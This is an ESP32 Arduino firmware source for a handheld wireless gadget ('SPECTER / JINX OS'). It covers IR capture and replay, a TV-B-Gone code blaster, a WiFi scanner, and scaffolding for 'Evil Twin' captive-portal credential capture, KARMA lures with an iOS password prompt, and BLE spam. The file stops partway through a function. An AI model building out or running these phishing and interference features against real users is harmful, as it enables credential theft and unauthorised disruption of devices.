// ============================================================
// JINX OS v9 — SPECTER
// Terminal Style UI — Green on Black
// ============================================================

#include <TFT_eSPI.h>
#include <SPI.h>
#include <IRremote.hpp>
#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>
#include <WebServer.h>
#include <DNSServer.h>

// --- Pin definitions ---
#define IR_RECV_PIN  15
#define IR_BLAST_PIN 4

TFT_eSPI tft = TFT_eSPI();

// ============================================================
// COLOUR PALETTE
// ============================================================
#define C_BG       0x0000
#define C_GREEN    0x07E0
#define C_DGREEN   0x03E0
#define C_DDGREEN  0x01C0
#define C_WHITE    0xFFFF
#define C_GREY     0x8410
#define C_DGREY    0x2104
#define C_RED      0xF800
#define C_YELLOW   0xFFE0
#define C_CYAN     0x07FF
#define C_ORANGE   0xFD20
#define C_PURPLE   0x780F
#define C_BLUE     0x001F

// ============================================================
// STATES
// ============================================================
enum State {
  S_SPLASH, S_HOME,
  S_IR_MENU, S_IR_BLASTER, S_IR_TVBGONE, S_IR_SELFTEST,
  S_WIFI_MENU, S_WIFI_SCANNER, S_WIFI_DETAIL, S_WIFI_ATTACKS,
  S_WIFI_BEACON, S_WIFI_PROBE,
  S_BLE_MENU, S_BLE_SCANNER, S_BLE_SPAM,
  S_EVIL_TWIN, S_KARMA
};
State currentState = S_SPLASH;

// --- WiFi ---
int wifiCount     = 0;
int wifiScroll    = 0;
int wifiDetailIdx = -1;
bool wifiSortSig  = true;
int wifiIdx[64];

// --- Probe sniffer ---
bool probeRunning = false;
struct ProbeEntry { char mac[18]; char ssid[33]; int rssi; };
#define MAX_PROBES 20
ProbeEntry probeLog[MAX_PROBES];
int probeCount  = 0;
int probeScroll = 0;

// --- Evil Twin ---
bool evilTwinRunning = false;
int  evilTwinTargetIdx = -1;
struct CredEntry { char email[64]; char pass[64]; };
#define MAX_CREDS 20
CredEntry credLog[MAX_CREDS];
int credCount  = 0;
int credScroll = 0;
WebServer* evilServer = nullptr;
DNSServer* evilDNS    = nullptr;

// --- KARMA ---
#define KARMA_TARGET_SSID "TBFT"
bool karmaRunning = false;
struct KarmaEntry { char ssid[33]; char mac[18]; int count; };
#define MAX_KARMA 20
KarmaEntry karmaLog[MAX_KARMA];
int karmaCount  = 0;
int karmaScroll = 0;
WebServer* karmaServer = nullptr;
DNSServer* karmaDNS    = nullptr;

// --- BLE scanner ---
struct BLEEntry {
  char name[32];
  char mac[18];
  int  rssi;
  bool isApple;
};
#define MAX_BLE 30
BLEEntry bleLog[MAX_BLE];
int bleCount   = 0;
int bleScroll  = 0;
bool bleScanning = false;
BLEScan* pBLEScan = nullptr;

// --- BLE spam ---
bool bleSpamRunning = false;
int  bleSpamIdx     = 0;
int  bleSpamSent    = 0;

// --- IR ---
bool irListening = false;
bool irHasCode   = false;
uint32_t irValue = 0;
uint16_t irBits  = 0;
uint8_t  irProto = 0;

// --- Touch ---
uint16_t tx, ty;
unsigned long lastTouch = 0;
#define DEBOUNCE_MS 280

struct TVCode { uint8_t proto; uint32_t value; uint8_t bits; const char* brand; };

// ============================================================
// TOUCH
// ============================================================
bool getTouch(uint16_t &x, uint16_t &y) {
  uint16_t rx, ry;
  if (!tft.getTouch(&rx, &ry)) return false;
  x = map(ry, 299, 12, 0, 239);
  y = map(rx, 226, 11, 0, 319);
  x = constrain(x, 0, 239);
  y = constrain(y, 0, 319);
  return true;
}

// ============================================================
// PRIMITIVES
// ============================================================
void drawBar(const char* left, const char* right) {
  tft.fillRect(0, 0, 240, 14, C_DGREEN);
  tft.setTextColor(C_BG, C_DGREEN); tft.setTextSize(1);
  tft.setCursor(3, 3); tft.print(left);
  int rlen = strlen(right) * 6;
  tft.setCursor(237 - rlen, 3); tft.print(right);
}
void drawHeader(int y, const char* text) {
  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(0, y); tft.print("-- "); tft.print(text); tft.print(" ");
  int used = 3 + strlen(text) + 1;
  for (int i = used * 6; i < 240; i += 6) tft.print("-");
}
void drawBack() {
  tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(0, 17); tft.print("[<] BACK");
}
void drawBtn(int y, int h, const char* label, uint16_t col, bool active = true) {
  uint16_t bg = active ? C_DGREY : C_BG;
  tft.fillRect(0, y, 240, h, bg);
  tft.drawRect(0, y, 240, h, active ? col : C_DGREY);
  tft.fillRect(0, y, 3, h, col);
  tft.setTextColor(active ? col : C_DGREY, bg); tft.setTextSize(2);
  int tx2 = (240 - strlen(label) * 12) / 2;
  tft.setCursor(tx2, y + h/2 - 8); tft.print(label);
}
void drawTag(int x, int y, const char* text, uint16_t col) {
  int w = strlen(text) * 6 + 4;
  tft.drawRect(x, y, w, 10, col);
  tft.setTextColor(col, C_BG); tft.setTextSize(1);
  tft.setCursor(x + 2, y + 2); tft.print(text);
}
void drawHR(int y, uint16_t col = C_DGREEN) { tft.drawFastHLine(0, y, 240, col); }
bool backTapped(uint16_t x, uint16_t y) { return (y >= 0 && y <= 14); }

// ============================================================
// SPLASH
// ============================================================
void drawOniMask(int cx, int cy, int r) {
  tft.fillCircle(cx, cy, r, C_BG);
  tft.drawCircle(cx, cy, r, C_GREEN); tft.drawCircle(cx, cy, r-1, C_DGREEN);
  tft.fillCircle(cx-r/3, cy-r/6, r/5, C_GREEN); tft.fillCircle(cx+r/3, cy-r/6, r/5, C_GREEN);
  tft.fillCircle(cx-r/3, cy-r/6, r/10, C_BG);   tft.fillCircle(cx+r/3, cy-r/6, r/10, C_BG);
  tft.fillCircle(cx-r/3, cy-r/6, r/16, C_GREEN); tft.fillCircle(cx+r/3, cy-r/6, r/16, C_GREEN);
  tft.drawLine(cx-r/2, cy-r/2, cx-r/6, cy-r/3, C_GREEN);
  tft.drawLine(cx+r/2, cy-r/2, cx+r/6, cy-r/3, C_GREEN);
  tft.fillTriangle(cx, cy, cx-r/8, cy+r/4, cx+r/8, cy+r/4, C_DGREEN);
  tft.drawLine(cx-r/3, cy+r/2, cx+r/3, cy+r/2, C_GREEN);
  tft.drawLine(cx-r/3, cy+r/2, cx-r/2, cy+r/3, C_GREEN);
  tft.drawLine(cx+r/3, cy+r/2, cx+r/2, cy+r/3, C_GREEN);
  tft.fillRect(cx-r/4, cy+r/2-2, r/6, r/8, C_GREEN);
  tft.fillRect(cx+r/8, cy+r/2-2, r/6, r/8, C_GREEN);
  tft.fillTriangle(cx-r/2, cy-r, cx-r/3, cy-r-r/3, cx-r/6, cy-r, C_GREEN);
  tft.fillTriangle(cx+r/2, cy-r, cx+r/3, cy-r-r/3, cx+r/6, cy-r, C_GREEN);
}
void showSplash() {
  tft.fillScreen(C_BG);
  drawOniMask(120, 110, 55);
  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(3);
  tft.setCursor(28, 180); tft.print("SPECTER");
  tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(66, 207); tft.print("JINX OS v2.0");
  drawHR(220, C_DDGREEN); drawHR(222, C_DDGREEN);
  const char* bootLines[] = {
    "init hardware...", "mounting flash...",
    "loading IR db...", "wifi ready...", "boot ok."
  };
  int by = 228;
  for (int i = 0; i < 5; i++) {
    tft.setTextColor(C_DDGREEN, C_BG); tft.setTextSize(1);
    tft.setCursor(0, by); tft.print("> ");
    tft.setTextColor(C_DGREEN, C_BG); tft.print(bootLines[i]);
    by += 10; delay(120);
  }
  delay(400);
}

// ============================================================
// HOME
// ============================================================
void drawHomeScreen() {
  tft.fillScreen(C_BG);
  drawBar("SPECTER//JINX OS v2.0", "HOME");
  drawHR(14, C_DDGREEN);
  drawHeader(18, "SELECT MODULE");

  // IR
  tft.fillRect(0, 34, 240, 40, C_BG);
  tft.drawRect(0, 34, 240, 40, C_DGREEN);
  tft.fillRect(0, 34, 3, 40, C_RED);
  tft.setTextColor(C_RED, C_BG); tft.setTextSize(1); tft.setCursor(10, 38); tft.print("[IR]");
  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(2); tft.setCursor(10, 50); tft.print("INFRARED");
  drawHR(75, C_DDGREEN);

  // WiFi
  tft.fillRect(0, 77, 240, 40, C_BG);
  tft.drawRect(0, 77, 240, 40, C_DGREEN);
  tft.fillRect(0, 77, 3, 40, C_CYAN);
  tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(1); tft.setCursor(10, 81); tft.print("[WiFi]");
  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(2); tft.setCursor(10, 93); tft.print("WIRELESS");
  drawHR(118, C_DDGREEN);

  // BLE
  tft.fillRect(0, 120, 240, 40, C_BG);
  tft.drawRect(0, 120, 240, 40, C_DGREEN);
  tft.fillRect(0, 120, 3, 40, C_BLUE);
  tft.setTextColor(C_BLUE, C_BG); tft.setTextSize(1); tft.setCursor(10, 124); tft.print("[BLE]");
  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(2); tft.setCursor(10, 136); tft.print("BLUETOOTH");
  drawHR(161, C_DDGREEN);

  tft.setTextColor(C_DDGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(0, 168); tft.print("> [SUB-GHZ]  coming soon");
  tft.setCursor(0, 181); tft.print("> [NFC]      coming soon");
  tft.setCursor(0, 194); tft.print("> [BADUSB]   coming soon");
  drawHR(207, C_DDGREEN);
  tft.setTextColor(C_DDGREEN, C_BG);
  tft.setCursor(0, 211); tft.print("specter//ready_");
}

bool homeIRTapped(uint16_t x, uint16_t y)   { return (y >= 34  && y <= 75); }
bool homeWiFiTapped(uint16_t x, uint16_t y) { return (y >= 77  && y <= 118); }
bool homeBLETapped(uint16_t x, uint16_t y)  { return (y >= 120 && y <= 161); }

// ============================================================
// IR MENU
// ============================================================
void drawIRMenu() {
  tft.fillScreen(C_BG);
  drawBar("SPECTER//IR", "INFRARED");
  drawBack();
  drawHeader(30, "IR MODULE");
  drawBtn(42, 55, "IR BLASTER", C_RED, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 75); tft.print("capture + replay IR codes");
  drawHR(98, C_DDGREEN);
  drawBtn(101, 55, "TV-B-GONE", C_DGREEN, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 134); tft.print("blast all TV power codes");
  drawTag(178, 103, "READY", C_DGREEN);
  drawHR(157, C_DDGREEN);
  drawBtn(160, 55, "SELF TEST", C_YELLOW, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 193); tft.print("loop test: blast+recv verify");
  drawTag(165, 162, "DIAG", C_YELLOW);
}
bool irMenuBlasterTapped(uint16_t x, uint16_t y)  { return (y >= 42  && y <= 97); }
bool irMenuTVBGoneTapped(uint16_t x, uint16_t y)  { return (y >= 101 && y <= 156); }
bool irMenuSelfTestTapped(uint16_t x, uint16_t y) { return (y >= 160 && y <= 215); }

// ============================================================
// IR BLASTER
// ============================================================
void drawIRBlaster() {
  tft.fillScreen(C_BG);
  drawBar("SPECTER//IR", "BLASTER");
  drawBack();
  drawHeader(30, "IR BLASTER");
  tft.drawRect(0, 42, 240, 72, C_DGREEN);
  tft.fillRect(0, 42, 3, 72, irHasCode ? C_GREEN : C_DGREY);
  if (!irHasCode) {
    tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
    tft.setCursor(6, 50); tft.print("> no signal captured");
    tft.setCursor(6, 63); tft.print("> press LISTEN");
    tft.setCursor(6, 76); tft.print("> point remote at GPIO15");
    tft.setTextColor(C_DDGREEN, C_BG); tft.setCursor(6, 95); tft.print("status: waiting_");
  } else {
    tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(1);
    tft.setCursor(6, 50); tft.print("> signal locked");
    tft.setTextColor(C_DGREEN, C_BG); tft.setCursor(6, 63); tft.print("proto: ");
    tft.setTextColor(C_GREEN, C_BG); tft.print(getProtocolString((decode_type_t)irProto));
    tft.setTextColor(C_DGREEN, C_BG); tft.setCursor(6, 76); tft.print("value: ");
    tft.setTextColor(C_YELLOW, C_BG); tft.print("0x"); tft.print(irValue, HEX);
    tft.setTextColor(C_DGREEN, C_BG); tft.setCursor(6, 89); tft.print("bits:  ");
    tft.setTextColor(C_GREEN, C_BG); tft.print(irBits);
    tft.setCursor(170, 95); tft.print("[LOCKED]");
  }
  drawHR(115, C_DDGREEN);
  uint16_t lCol = irListening ? C_GREEN : C_DGREEN;
  drawBtn(118, 50, irListening ? "// LISTENING" : "LISTEN", lCol, true);
  if (irListening) {
    tft.setTextColor(C_GREEN, C_DGREY); tft.setTextSize(1);
    tft.setCursor(6, 154); tft.print("receiving on GPIO15...");
  }
  drawHR(169, C_DDGREEN);
  drawBtn(172, 50, "BLAST", irHasCode ? C_RED : C_DGREY, irHasCode);
  if (!irHasCode) {
    tft.setTextColor(C_DGREY, C_BG); tft.setTextSize(1);
    tft.setCursor(6, 208); tft.print("capture a signal first");
  }
}
bool irBlasterListenTapped(uint16_t x, uint16_t y) { return (y >= 118 && y <= 168); }
bool irBlasterBlastTapped(uint16_t x, uint16_t y)  { return (y >= 172 && y <= 222); }

void doBlast() {
  if (!irHasCode) return;
  tft.fillScreen(C_BG); drawBar("SPECTER//IR", "TRANSMIT");
  tft.setTextColor(C_RED, C_BG); tft.setTextSize(2);
  tft.setCursor(40, 120); tft.print("BLASTING...");
  tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(0, 150); tft.print("> transmitting IR signal");
  tft.setCursor(0, 163); tft.print("> repeat x15");
  delay(200);
  IRData irData;
  irData.protocol = (decode_type_t)irProto;
  irData.address  = (irValue >> 16) & 0xFFFF;
  irData.command  = irValue & 0xFFFF;
  irData.numberOfBits = irBits; irData.flags = 0;
  IrSender.begin(IR_BLAST_PIN);
  if (irProto == SONY) {
    uint8_t cmd = irData.command & 0x7F; uint8_t addr = irData.address & 0x1F;
    uint16_t sirc = (addr << 7) | cmd;
    for (int i = 0; i < 15; i++) { IrSender.sendSony(sirc, 12); delay(45); }
  } else {
    for (int i = 0; i < 20; i++) { IrSender.write(&irData, 0); delay(100); }
  }
  tft.setTextColor(C_GREEN, C_BG); tft.setCursor(0, 180); tft.print("> done.");
  delay(500); drawIRBlaster();
}

// ============================================================
// IR SELF TEST
// ============================================================
void drawIRSelfTest(int phase, bool passed) {
  tft.fillScreen(C_BG); drawBar("SPECTER//IR", "SELF TEST");
  drawBack(); drawHeader(30, "LOOP DIAGNOSTIC");
  tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(0, 42); tft.print("> cup hand over IR LEDs+recv");
  tft.setCursor(0, 55); tft.print("> test fires code + listens");
  tft.setCursor(0, 68); tft.print("> pass = IR circuit confirmed");
  drawHR(80, C_DDGREEN);
  uint16_t col1 = phase >= 1 ? C_GREEN : C_DGREY;
  uint16_t col2 = phase >= 2 ? C_GREEN : C_DGREY;
  uint16_t col3 = phase >= 3 ? (passed ? C_GREEN : C_RED) : C_DGREY;
  tft.setTextColor(col1, C_BG); tft.setCursor(0, 90);
  tft.print(phase >= 1 ? "> [OK] blasting Sony code..." : "> [ ] blast IR code");
  tft.setTextColor(col2, C_BG); tft.setCursor(0, 103);
  tft.print(phase >= 2 ? "> [OK] listening on GPIO15..." : "> [ ] switch to receive");
  tft.setTextColor(col3, C_BG); tft.setCursor(0, 116);
  if      (phase < 3)  tft.print("> [ ] check signal received");
  else if (passed)     tft.print("> [PASS] signal received!");
  else                 tft.print("> [FAIL] no signal detected");
  drawHR(130, C_DDGREEN);
  if (phase == 0) {
    drawBtn(133, 50, "RUN TEST", C_YELLOW, true);
    tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
    tft.setCursor(0, 195); tft.print("> cup hand over device first");
  } else if (phase == 3) {
    if (passed) {
      tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(2);
      tft.setCursor(50, 148); tft.print("IR OK!");
      tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
      tft.setCursor(0, 178); tft.print("> hardware confirmed working");
      tft.setCursor(0, 191); tft.print("> range issue = LED power");
    } else {
      tft.setTextColor(C_RED, C_BG); tft.setTextSize(2);
      tft.setCursor(30, 148); tft.print("IR FAIL");
      tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
      tft.setCursor(0, 178); tft.print("> check wiring GPIO4 + 15");
      tft.setCursor(0, 191); tft.print("> check LED orientation");
    }
    drawBtn(210, 40, "RETRY", C_YELLOW, true);
  }
}
bool irSelfTestRunTapped(uint16_t x, uint16_t y)   { return (y >= 133 && y <= 183); }
bool irSelfTestRetryTapped(uint16_t x, uint16_t y) { return (y >= 210 && y <= 250); }
void runIRSelfTest() {
  IrReceiver.begin(IR_RECV_PIN, DISABLE_LED_FEEDBACK); delay(50);
  drawIRSelfTest(1, false); delay(100);
  IrSender.begin(IR_BLAST_PIN);
  for (int i = 0; i < 3; i++) { IrSender.sendSony(0x95, 12); delay(45); }
  drawIRSelfTest(2, false);
  bool detected = false;
  unsigned long start = millis();
  while (millis() - start < 800) {
    if (IrReceiver.decode()) {
      if (IrReceiver.decodedIRData.decodedRawData != 0) { detected = true; IrReceiver.resume(); break; }
      IrReceiver.resume();
    }
  }
  IrReceiver.stop(); drawIRSelfTest(3, detected);
}

// ============================================================
// TV-B-GONE
// ============================================================
const TVCode tvCodes[] = {
  {1,0x95,12,"Sony"},{1,0xA90,12,"Sony"},{1,0x290,12,"Sony"},{1,0x490,12,"Sony"},
  {3,0xE0E040BF,32,"Samsung"},{3,0xE0E019E6,32,"Samsung"},{3,0xE0E09966,32,"Samsung"},
  {0,0x20DF10EF,32,"LG"},{0,0x20DFB44B,32,"LG"},{0,0x10EF10EF,32,"LG"},
  {0,0xAAAA5A00,32,"Panasonic"},{2,0x0C,12,"Philips"},{0,0x04FB48B7,32,"Philips"},
  {0,0x02FD48B7,32,"Toshiba"},{0,0x02FD807F,32,"Toshiba"},
  {0,0xAA5695FA,32,"Sharp"},{0,0x10AF8877,32,"Sharp"},
  {0,0x0000E01F,32,"Hisense"},{0,0x40BF30CF,32,"Hisense"},
  {0,0x61A0F00F,32,"TCL"},{0,0x9768E11E,32,"TCL"},{0,0x00FF02FD,32,"TCL"},
  {0,0x20DF10EF,32,"Vizio"},{0,0xC5E8D827,32,"Hitachi"},
  {0,0x4BB640BF,32,"Haier"},{0,0x08F748B7,32,"Beko"},
};
const int TV_CODE_COUNT = sizeof(tvCodes) / sizeof(tvCodes[0]);
bool tvbRunning = false;
void sendTVCode(const TVCode& c) {
  IrSender.begin(IR_BLAST_PIN);
  switch (c.proto) {
    case 0: IrSender.sendNEC(c.value, c.bits); break;
    case 1: for(int r=0;r<3;r++){IrSender.sendSony(c.value,c.bits);delay(45);} return;
    case 2: IrSender.sendRC5(c.value, c.bits); break;
    case 3: IrSender.sendSAMSUNG(c.value, c.bits); break;
  }
  delay(50);
}
void drawTVBGone() {
  tft.fillScreen(C_BG); drawBar("SPECTER//IR", "TV-B-GONE");
  drawBack(); drawHeader(30, "TV KILL SWITCH");
  tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(0, 40); tft.print("> "); tft.print(TV_CODE_COUNT); tft.print(" codes loaded");
  tft.setCursor(0, 52); tft.print("> sony/samsung/lg/tcl +more");
  tft.setCursor(0, 64); tft.print("> point at TV, press FIRE");
  drawHR(76, C_DDGREEN); drawBtn(79, 60, "[ FIRE ]", C_RED, true);
  drawHR(140, C_DDGREEN); tft.drawRect(0, 143, 240, 14, C_DGREY);
  tft.setTextColor(C_DDGREEN, C_BG); tft.setCursor(0, 160); tft.print("> awaiting trigger_");
}
void runTVBGone() {
  tvbRunning = true; IrSender.begin(IR_BLAST_PIN);
  for (int i = 0; i < TV_CODE_COUNT; i++) {
    tft.fillRect(0, 158, 240, 10, C_BG);
    tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(1); tft.setCursor(0, 160);
    tft.print("> "); tft.print(i+1); tft.print("/"); tft.print(TV_CODE_COUNT);
    tft.print(" "); tft.print(tvCodes[i].brand);
    tft.fillRect(1, 144, map(i+1, 0, TV_CODE_COUNT, 0, 238), 12, C_DGREEN);
    sendTVCode(tvCodes[i]); delay(150);
  }
  tft.fillRect(1, 144, 238, 12, C_GREEN); tft.fillRect(0, 158, 240, 10, C_BG);
  tft.setTextColor(C_GREEN, C_BG); tft.setTextSize(1); tft.setCursor(0, 160);
  tft.print("> complete. "); tft.print(TV_CODE_COUNT); tft.print(" codes sent.");
  tvbRunning = false;
}
bool tvbFireTapped(uint16_t x, uint16_t y) { return (y >= 79 && y <= 139); }

// ============================================================
// WIFI MENU
// ============================================================
void drawWiFiMenu() {
  tft.fillScreen(C_BG); drawBar("SPECTER//WIFI", "WIRELESS");
  drawBack(); drawHeader(30, "WIFI MODULE");
  drawBtn(42, 60, "NET SCANNER", C_CYAN, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 78); tft.print("passive network recon");
  drawHR(103, C_DDGREEN);
  drawBtn(106, 60, "ATTACKS", C_RED, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 142); tft.print("probe sniff / more");
}
bool wifiMenuScannerTapped(uint16_t x, uint16_t y) { return (y >= 42  && y <= 102); }
bool wifiMenuAttacksTapped(uint16_t x, uint16_t y) { return (y >= 106 && y <= 166); }

// ============================================================
// WIFI ATTACKS MENU
// ============================================================
void drawWiFiAttacks() {
  tft.fillScreen(C_BG); drawBar("SPECTER//WIFI", "ATTACKS");
  drawBack(); drawHeader(30, "ATTACK MODULE");

  // Beacon flood — coming soon
  tft.fillRect(0, 42, 240, 45, C_BG);
  tft.drawRect(0, 42, 240, 45, C_DGREY);
  tft.fillRect(0, 42, 3, 45, C_DGREY);
  tft.setTextColor(C_DGREY, C_BG); tft.setTextSize(2);
  tft.setCursor(12, 55); tft.print("BEACON FLOOD");
  tft.setTextColor(C_DGREY, C_BG); tft.setTextSize(1);
  tft.setCursor(6, 76); tft.print("coming soon");
  drawTag(170, 44, "SOON", C_DGREY);

  drawHR(88, C_DDGREEN);

  drawBtn(91, 45, "PROBE SNIFF", C_PURPLE, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 116); tft.print("passive probe capture");
  drawTag(165, 93, "PASSIVE", C_PURPLE);

  drawHR(137, C_DDGREEN);

  drawBtn(140, 45, "EVIL TWIN", C_RED, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 165); tft.print("captive portal credential grab");
  drawTag(170, 142, "ACTIVE", C_RED);

  drawHR(186, C_DDGREEN);

  drawBtn(189, 40, "KARMA", C_ORANGE, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 214); tft.print("auto-lure + iOS pwd prompt");
  drawTag(175, 191, "AUTO", C_ORANGE);

  drawHR(230, C_DDGREEN);

  // Deauth — coming soon
  tft.fillRect(0, 233, 240, 30, C_BG);
  tft.drawRect(0, 233, 240, 30, C_DGREY);
  tft.fillRect(0, 233, 3, 30, C_DGREY);
  tft.setTextColor(C_DGREY, C_BG); tft.setTextSize(1);
  tft.setCursor(30, 243); tft.print("DEAUTH — coming soon");
  drawTag(170, 235, "SOON", C_DGREY);
}
bool wifiAttacksProbeTapped(uint16_t x, uint16_t y)     { return (y >= 91  && y <= 136); }
bool wifiAttacksEvilTwinTapped(uint16_t x, uint16_t y)  { return (y >= 140 && y <= 185); }
bool wifiAttacksKarmaTapped(uint16_t x, uint16_t y)     { return (y >= 189 && y <= 229); }

// ============================================================
// WIFI SCANNER
// ============================================================
#define SCAN_LIST_TOP  44
#define SCAN_BTN_TOP   240
#define SCAN_ROW_H     19
#define SCAN_MAX_ROWS  10

int rssiToBars(int rssi) {
  if (rssi >= -50) return 4; if (rssi >= -65) return 3;
  if (rssi >= -75) return 2; if (rssi >= -85) return 1; return 0;
}
uint16_t rssiToCol(int rssi) {
  if (rssi >= -60) return C_GREEN; if (rssi >= -75) return C_YELLOW; return C_RED;
}
void drawBars(int x, int y, int bars, uint16_t col) {
  for (int i = 0; i < 4; i++) {
    int h = (i+1)*3; tft.fillRect(x+i*5, y+(12-h), 4, h, i < bars ? col : C_DGREY);
  }
}
const char* getMfr(uint8_t* b) {
  uint32_t oui = ((uint32_t)b[0]<<16)|((uint32_t)b[1]<<8)|b[2];
  switch(oui) {
    case 0xF4F26D: case 0x14CC20: case 0xB0BE76: case 0x74DA38: case 0xC80E14: case 0x50C7BF: return "TP-Link";
    case 0x28286B: case 0xA42BB0: case 0x8C10D4: case 0x9C3DCF: case 0x4C60DE: case 0x00146C: return "Netgear";
    case 0xD86CE9: case 0x34298F: case 0xF832E4: case 0xAC220B: case 0x04D9F5: case 0x08606E: return "Asus";
    case 0xC0056C: case 0xCC46D6: case 0x0014BF: return "Linksys";
    case 0x58EF68: case 0xD460E3: case 0x9057D3: case 0x7868A8: case 0x38229D: case 0x28B2BD: return "BT";
    case 0x64D954: case 0xA4082B: case 0x647002: case 0x2C3AE8: case 0xFC8B97: case 0x18A6F7: return "Sky";
    case 0x286ED4: case 0xB4A5AC: case 0x9C1C12: return "Virgin";
    case 0x7C8BCA: case 0x001A2B: case 0x001CF0: return "Cisco";
    case 0xE894F6: case 0x08EA40: case 0xF81A67: case 0x4C5E0C: case 0x001E10: case 0xF0DEF1: return "Huawei";
    case 0x60A4B7: case 0xDC9FA4: case 0x687FF0: return "D-Link";
    case 0xBC0F9A: case 0xCC03FA: case 0x1C5F2B: return "Eero";
    case 0x944452: case 0x503FC6: case 0xA04091: return "Ubiquiti";
    default: return "?";
  }
}
void sortBySignal() {
  for (int i = 0; i < wifiCount; i++) wifiIdx[i] = i;
  for (int i = 0; i < wifiCount-1; i++)
    for (int j = 0; j < wifiCount-i-1; j++)
      if (WiFi.RSSI(wifiIdx[j]) < WiFi.RSSI(wifiIdx[j+1])) { int t=wifiIdx[j]; wifiIdx[j]=wifiIdx[j+1]; wifiIdx[j+1]=t; }
}
bool hasConflict(int idx) {
  int ch = WiFi.channel(idx);
  for (int i = 0; i < wifiCount; i++) if (i != idx && WiFi.channel(i) == ch) return true;
  return false;
}
void drawWiFiScanner() {
  tft.fillScreen(C_BG); drawBar("SPECTER//WIFI", "SCANNER"); drawBack();
  tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(4, 30); tft.print("SSID");
  tft.setCursor(148, 30); tft.print("CH");
  tft.setCursor(168, 30); tft.print("SEC");
  tft.setCursor(200, 30); tft.print("SIG");
  drawHR(SCAN_LIST_TOP - 2, C_DDGREEN);
  if (wifiCount == 0) {
    tft.setTextColor(C_DGREEN, C_BG);
    tft.setCursor(0, 90); tft.print("> no scan data");
    tft.setCursor(0, 103); tft.print("> press SCAN below");
    tft.setTextColor(C_DDGREEN, C_BG); tft.setCursor(0, 116); tft.print("> awaiting command_");
  } else {
    int y = SCAN_LIST_TOP;
    for (int vi = wifiScroll; vi < wifiCount && vi < wifiScroll + SCAN_MAX_ROWS; vi++) {
      int i = wifiSortSig ? wifiIdx[vi] : vi;
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0) ssid = "(hidden)";
      if (ssid.length() > 14) ssid = ssid.substring(0, 13) + "~";
      int rssi = WiFi.RSSI(i); int ch = WiFi.channel(i);
      bool open = WiFi.encryptionType(i) == WIFI_AUTH_OPEN;
      bool conf = hasConflict(i); uint16_t col = rssiToCol(rssi);
      uint16_t rowBg = (vi % 2 == 0) ? C_DGREY : C_BG;
      tft.fillRect(0, y, 240, SCAN_ROW_H, rowBg); tft.fillRect(0, y, 3, SCAN_ROW_H, col);
      tft.setTextColor(C_WHITE, rowBg); tft.setTextSize(1); tft.setCursor(6, y+6); tft.print(ssid);
      tft.setTextColor(conf ? C_YELLOW : C_DGREEN, rowBg); tft.setCursor(148, y+6); tft.print(ch);
      tft.setTextColor(open ? C_GREEN : C_RED, rowBg); tft.setCursor(168, y+6); tft.print(open ? "OPN" : "WPA");
      drawBars(200, y+2, rssiToBars(rssi), col); y += SCAN_ROW_H;
    }
    if (wifiCount > SCAN_MAX_ROWS) {
      tft.setTextColor(C_DDGREEN, C_BG); tft.setTextSize(1); tft.setCursor(150, SCAN_BTN_TOP - 10);
      tft.print(wifiScroll+1); tft.print("-"); tft.print(min(wifiScroll+SCAN_MAX_ROWS, wifiCount));
      tft.print("/"); tft.print(wifiCount);
    }
  }
  drawHR(SCAN_BTN_TOP - 1, C_DGREEN);
  tft.fillRect(0, SCAN_BTN_TOP, 240, 80, C_DGREY);
  tft.drawRect(0, SCAN_BTN_TOP, 240, 80, C_CYAN); tft.fillRect(0, SCAN_BTN_TOP, 3, 80, C_CYAN);
  tft.setTextColor(C_CYAN, C_DGREY); tft.setTextSize(3); tft.setCursor(60, SCAN_BTN_TOP+24); tft.print("SCAN");
}
bool wifiScannerScanTapped(uint16_t x, uint16_t y)  { return (y >= SCAN_BTN_TOP); }
bool wifiScannerScrollUp(uint16_t x, uint16_t y)    { return (y >= SCAN_LIST_TOP && y < SCAN_BTN_TOP && x < 20 && wifiCount > 0); }
bool wifiScannerScrollDown(uint16_t x, uint16_t y)  { return (y >= SCAN_LIST_TOP && y < SCAN_BTN_TOP && x > 220 && wifiCount > 0); }
int wifiRowTapped(uint16_t x, uint16_t y) {
  if (y < SCAN_LIST_TOP || y >= SCAN_BTN_TOP || x < 20 || x > 220) return -1;
  int row = (y - SCAN_LIST_TOP) / SCAN_ROW_H;
  int vi = wifiScroll + row;
  if (vi >= wifiCount) return -1;
